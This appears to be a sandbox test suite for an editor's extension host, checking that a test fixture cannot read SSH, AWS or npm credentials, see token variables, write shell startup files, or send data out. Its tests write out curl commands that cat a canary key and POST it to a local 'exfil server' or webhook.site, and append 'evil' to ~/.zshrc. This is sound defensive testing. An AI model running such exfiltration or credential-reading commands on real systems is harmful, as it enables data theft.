/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Volt ADK. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

// EXT-LAB-OS: what the Agent Lab test fixture (docs/volt/examples/volt-agent-lab/src/testFixture)
// does outside `vscode.volt`, run under the policy a sandboxed extension host gets
// (`t3ExtensionHostPolicy`) on this machine's real backend (Seatbelt, bubblewrap). Each switch is
// acted out with the shell tools the fixture's shell uses, in a throwaway home with canaries:
// nothing it reads leaves the sandbox, the exfil server gets no request, and a positive control
// proves the run happened. Skips loudly without a backend; fails under VOLT_SANDBOX_REQUIRED.

import assert from 'assert';
import { existsSync, promises as fs } from 'fs';
import * as http from 'http';
import { tmpdir } from 'os';
import { join } from '../../../../base/common/path.js';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../base/test/common/utils.js';
import { ISandboxRunResult } from '../../../voltSandbox/common/sandboxBackend.js';
import { t3ExtensionHostPolicy } from '../../../voltSandbox/common/extensionHostSandbox.js';
import { SandboxManager } from '../../../voltSandbox/node/sandboxManager.js';
import { sandboxHostFacts } from '../../../voltSandbox/node/sandboxResolver.js';
import { realSandboxAvailable } from '../../../voltSandbox/test/node/sandboxSuiteGate.js';

const CANARY = 'VOLT-CANARY-agent-lab not a real key';
const CURL = ['/usr/bin/curl', '/bin/curl'].find(existsSync);

suite('Agent Lab test fixture under the extension host sandbox (EXT-LAB-OS)', function () {

	this.timeout(120_000);
	ensureNoDisposablesAreLeakedInTestSuite();

	let root: string;
	let home: string;
	let extensionDir: string;
	let storageDir: string;
	let ws: string;
	let manager: SandboxManager | undefined;
	let available = false;
	let server: http.Server;
	let port = 0;
	const received: string[] = [];

	suiteSetup(async () => {
		root = await fs.realpath(await fs.mkdtemp(join(tmpdir(), 'volt-agent-lab-')));
		home = join(root, 'home');
		extensionDir = join(home, '.volt', 'extensions', 'volt-examples.volt-agent-lab-0.1.0');
		storageDir = join(root, 'globalStorage', 'volt-examples.volt-agent-lab');
		ws = join(root, 'ws');
		for (const dir of [join(home, '.ssh'), join(home, '.aws'), join(home, '.volt', 'trust'), join(extensionDir, 'out'), storageDir, ws]) {
			await fs.mkdir(dir, { recursive: true });
		}
		await fs.writeFile(join(home, '.ssh', 'volt-agent-lab-canary'), `${CANARY}\n`);
		await fs.writeFile(join(home, '.aws', 'credentials'), `[default]\naws_secret_access_key=${CANARY}\n`);
		await fs.writeFile(join(home, '.volt', 'trust', 'grants.json'), `{"canary":"${CANARY}"}`);
		await fs.writeFile(join(home, '.npmrc'), `//registry.npmjs.org/:_authToken=${CANARY}\n`);
		await fs.writeFile(join(extensionDir, 'out', 'extension.js'), '// its own code: readable\n');
		await fs.writeFile(join(ws, 'package.json'), '{"dependencies":{"left-pad":"^1.3.0"}}');
		// The test's exfil server: an undeclared host on loopback, counting every request.
		server = http.createServer((request, response) => {
			let body = '';
			request.on('data', chunk => body += chunk);
			request.on('end', () => { received.push(`${request.method} ${request.url} ${body}`); response.end('ok'); });
		});
		await new Promise<void>(resolve => server.listen(0, '127.0.0.1', resolve));
		port = (server.address() as { port: number }).port;
		manager = new SandboxManager(undefined, { runRoot: join(root, 'runs'), host: { ...await sandboxHostFacts(), home } });
		available = realSandboxAvailable(await manager.capabilities(), 'Agent Lab sandbox suite') && !!CURL;
	});

	suiteTeardown(async () => {
		await manager?.dispose();
		await new Promise<void>(resolve => server?.close(() => resolve()));
		if (root) {
			await fs.rm(root, { recursive: true, force: true });
		}
	});

	setup(function () {
		if (!available) {
			this.skip();
		}
	});

	/** Runs `script` the way the sandboxed host would, and proves it ran. */
	async function run(script: string): Promise<ISandboxRunResult> {
		const policy = t3ExtensionHostPolicy({ platform: process.platform, home, extensionDir, appRoots: [], workspaceTrusted: true });
		const result = await manager!.run({
			command: '/bin/sh',
			args: ['-c', `echo volt-sandbox-ran; ${script}`],
			policy,
			context: {
				workspaceRoots: [ws],
				cwd: extensionDir,
				storageDir,
				hostEnv: { PATH: '/usr/bin:/bin:/usr/sbin:/sbin', HOME: home, LANG: 'C', GITHUB_TOKEN: CANARY, ANTHROPIC_API_KEY: CANARY, NPM_TOKEN: CANARY },
			},
		}, { timeoutMs: 30_000 });
		assert.strictEqual(result.status, 'completed', `the run did not happen: ${result.error ?? ''} ${result.stderr}`);
		assert.ok(result.stdout.startsWith('volt-sandbox-ran'), `the script did not start: ${result.stderr}`);
		return result;
	}

	test('EXT-LAB-OS-1 positive control: its own folder, the trusted workspace and its storage work', async () => {
		const result = await run(`cat '${join(extensionDir, 'out', 'extension.js')}'; cat '${join(ws, 'package.json')}'; echo stored > '${join(storageDir, 'fixture-results.json')}' && echo WROTE`);
		assert.ok(result.stdout.includes('its own code: readable'), result.stdout);
		assert.ok(result.stdout.includes('left-pad'), result.stdout);
		assert.ok(result.stdout.includes('WROTE'), result.stderr);
	});

	test('EXT-LAB-OS-2 readCanary / readSecrets: the canary, ~/.aws, ~/.npmrc and Volt\'s grants stay unreadable', async () => {
		const result = await run(['.ssh/volt-agent-lab-canary', '.aws/credentials', '.npmrc', '.volt/trust/grants.json'].map(path => `cat '${join(home, path)}' 2>&1`).join('; '));
		assert.ok(!result.stdout.includes(CANARY), result.stdout);
	});

	test('EXT-LAB-OS-3 readSecrets: secret-looking variables never reach it', async () => {
		const result = await run('env');
		assert.ok(!result.stdout.includes(CANARY), 'no secret value');
		assert.ok(!/^(GITHUB_TOKEN|ANTHROPIC_API_KEY|NPM_TOKEN)=/m.test(result.stdout), result.stdout);
	});

	test('EXT-LAB-OS-4 exfiltrate / spawnShell / obfuscated: nothing reaches the undeclared host, directly or through the proxy', async () => {
		const canary = join(home, '.ssh', 'volt-agent-lab-canary');
		const before = received.length;
		const result = await run([
			// Around the proxy (Node's own http client does this): a direct socket.
			`${CURL} -s -m 4 --noproxy '*' -o /dev/null -w 'direct:%{http_code}\\n' -X POST --data-binary 'stolen' http://127.0.0.1:${port}/collect 2>&1`,
			// The shell switch: cat the canary and post it.
			`sh -c "cat '${canary}'; ${CURL} -s -m 4 --noproxy '*' -X POST --data-binary @'${canary}' http://127.0.0.1:${port}/collect?via=shell" 2>&1`,
			// Through the proxy Volt sets: an undeclared host (a request catcher) is refused.
			`${CURL} -s -m 6 -o /dev/null -w 'proxied:%{http_code}\\n' https://webhook.site/volt-agent-lab-test 2>&1`,
			`echo done`,
		].join('; '));
		assert.ok(!result.stdout.includes(CANARY), result.stdout);
		assert.ok(!/direct:2\d\d/.test(result.stdout), result.stdout);
		assert.ok(!/proxied:2\d\d/.test(result.stdout), result.stdout);
		assert.strictEqual(received.length - before, 0, `the exfil server got: ${received.slice(before).join(' | ')}`);
		assert.ok(result.stdout.includes('done'));
		assert.ok(result.denials.some(denial => denial.kind === 'network'), `the sandbox reported the network refusals: ${JSON.stringify(result.denials)}`);
	});

	test('EXT-LAB-OS-5 persistence: it cannot write outside its storage (shell startup files, Volt\'s grants, the workspace)', async () => {
		await run([`echo evil >> '${join(home, '.zshrc')}'`, `echo '{}' > '${join(home, '.volt', 'trust', 'grants.json')}'`, `echo evil > '${join(ws, 'injected.js')}'`].map(command => `${command} 2>/dev/null`).join('; '));
		assert.ok(!existsSync(join(home, '.zshrc')));
		assert.ok((await fs.readFile(join(home, '.volt', 'trust', 'grants.json'), 'utf8')).includes(CANARY));
		assert.ok(!existsSync(join(ws, 'injected.js')));
	});
});
